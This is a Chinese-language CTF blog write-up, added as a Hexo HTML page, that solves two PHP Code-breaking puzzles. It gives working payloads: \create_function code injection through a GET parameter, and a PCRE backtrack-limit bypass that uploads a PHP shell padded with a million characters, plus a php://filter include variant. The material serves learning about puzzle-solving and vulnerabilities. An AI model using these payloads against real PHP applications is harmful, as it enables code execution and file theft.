@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>Code-breaking | Love to share</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-function"><span class="toc-text">easy-function</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#这边从大佬们的题解里学到了php默认的命名空间是"><span class="toc-text">这边从大佬们的题解里学到了php默认的命名空间是 \</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-prcewaf"><span class="toc-text">easy_prcewaf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#解决办法：正则匹配-回溯超过最大次数（100万次）则正则匹配失败，导致的绕过"><span class="toc-text">解决办法：正则匹配 回溯超过最大次数（100万次）则正则匹配失败，导致的绕过</span></a></li></ol></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Code-breaking</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">zhhhy</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">December 9, 2018&nbsp;&nbsp;11:42:05</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <p> 发现P神办了个小密圈两周年的活动，并且放了一些题目。学习记录一下</p>
+<p><a href="https://code-breaking.com/" target="_blank" rel="noopener">https://code-breaking.com/</a></p>
+<a id="more"></a>
+
+<h2 id="easy-function"><a href="#easy-function" class="headerlink" title="easy-function"></a>easy-function</h2><p>这道题代码很短，就几行，但是学到了新知识</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不难看出，需要通过传入<code>action</code>作为函数名，传入<code>arg</code>作为该函数的变量。初步的想法是构造成<code>eval</code>函数然后任意执行代码。这里犯了个错，<code>eval</code>是一种语言结构而不是函数，所以不能通过这种动态调用函数的方式调用，所以改用<code>assert</code>。</p>
+<p><img src="code-breaking/1.png" alt></p>
+<p>但是发现<code>action</code>是有两个参数的，所以<code>assert</code>和<code>system</code>不行。试试，create_fuction()，为了本地测试方便，先将正则部分注释掉了。</p>
+<p><img src="code-breaking/2.png" alt></p>
+<p>​    再看正则部分，<code>action</code>要出现除了字母数字以及下划线以外的字符。回想一下所有的函数名，似乎都是字母构成的，例如<code>system</code>，<code>assert</code>如果引入一个非字母的字符，必然导致函数无法执行。</p>
+<h3 id="这边从大佬们的题解里学到了php默认的命名空间是"><a href="#这边从大佬们的题解里学到了php默认的命名空间是" class="headerlink" title="这边从大佬们的题解里学到了php默认的命名空间是 \"></a>这边从大佬们的题解里学到了<code>php默认的命名空间是 \</code></h3><blockquote>
+<p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。</p>
+<p>如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p>
+<p> 就是 <code>\</code> 在php中表示默认的命名空间，比如写一些类的时候会在开头写 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span>;</span><br><span class="line">&gt; <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Exception</span>;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>也就是说，调用<code>php自带的原生函数时</code>可以在前面加一个<code>\</code>，这样的写法就是调用默认命名空间中的某个函数。</p>
+<p><img src="code-breaking/3.png" alt></p>
+<p>这样就满足了正则，就可以注入任意代码了。</p>
+<p>这边应该是禁用了<code>system</code>函数，所以不能直接调用系统命令。因此payload如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//51.158.75.42:8087/?action=\create_function&amp;arg=&#125;print_r(scandir(%27../%27));//</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//51.158.75.42:8087/?action=\create_function&amp;arg=&#125;print_r(file_get_contents(%27../flag_h0w2execute_arb1trary_c0de%27));//</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="easy-prcewaf"><a href="#easy-prcewaf" class="headerlink" title="easy_prcewaf"></a>easy_prcewaf</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>是一个模拟文件上传的过程。并且会讲上传的文件内容读取出来，判断里面是否写入了<code>php代码</code>这样可能是为了防止<code>文件包含漏洞</code>吧.文件上传之后会被保存在一个以用户<code>ip用md5加密后</code>的路径下，并且用一个随机数字重命名该文件。</p>
+<p>问题的关键点在于如何绕过<code>is_php</code>这个正则。只要绕过这里，就可以上传任意的<code>php</code>文件并且执行。最先想到的是之前做过类似<code>死亡退出</code>的那题。将<strong><?php()?></strong>这些字符利用编码的方式变成满足正则的字符串。然后再通过某种方式解码，还原成正常的<code>php</code>代码，就可以执行了。<br>​    可控的输入点只有文件的内容。也就意味着，没办法利用伪协议进行编码解码的操作。</p>
+<h3 id="解决办法：正则匹配-回溯超过最大次数（100万次）则正则匹配失败，导致的绕过"><a href="#解决办法：正则匹配-回溯超过最大次数（100万次）则正则匹配失败，导致的绕过" class="headerlink" title="解决办法：正则匹配 回溯超过最大次数（100万次）则正则匹配失败，导致的绕过"></a>解决办法：正则匹配 回溯超过最大次数（100万次）则正则匹配失败，导致的绕过</h3><p><a href="http://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/" target="_blank" rel="noopener">http://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p>
+<p>原理在以上两篇文章写的很清楚了。只记录下具体做法。</p>
+<p>因此<code>payload</code>如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#我是写了一个上传文件的表单</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">"http://51.158.75.42:8088/"</span> method=<span class="string">"post"</span></span><br><span class="line">enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;Filename:&lt;/label&gt;</span><br><span class="line">&lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span> /&gt; </span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"Submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python生成一个文件</span></span><br><span class="line">with open(<span class="string">"shell.txt"</span>, <span class="string">"w+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(<span class="string">"&lt;?php print_r(scandir('../../../'));print_r(file_get_contents('../../../flag_php7_2_1s_c0rrect'));/*"</span>+<span class="string">'A'</span>*<span class="number">1000000</span></span><br></pre></td></tr></table></figure>
+
+<p>上传这个文件就能拿到<code>flag</code>。当绕过了正则，其实<code>php</code>的代码内容就可以发挥各自的想象<br>比如利用<code>include</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(<span class="string">"shell.txt"</span>, <span class="string">"w+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(<span class="string">"&lt;?php include 'php://filter/read=convert.base64-decode/resource=./5.php';/*"</span>+<span class="string">'A'</span>*<span class="number">1000000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>先上传一个文件内容用<code>base64</code>加密好的文件，再上传这个<code>shell.txt</code>就可以<code>getshell</code>;</p>
+<p><img src="code-breaking/4.png" alt></p>
+
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>zhhhy</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2018/12/09/code-breaking/">http://yoursite.com/2018/12/09/code-breaking/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Solgan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/代码审计/"># 代码审计</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/01/18/分割篇/">分割篇</a>
+            
+            
+            <a class="next" rel="next" href="/2018/11/22/eval长度限制绕过/">eval长度限制绕过</a>
+            
+        </section>
+
+
+    </article>
+</div>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© zhhhy | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Sirice19/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+    </div>
+</body>
+</html>
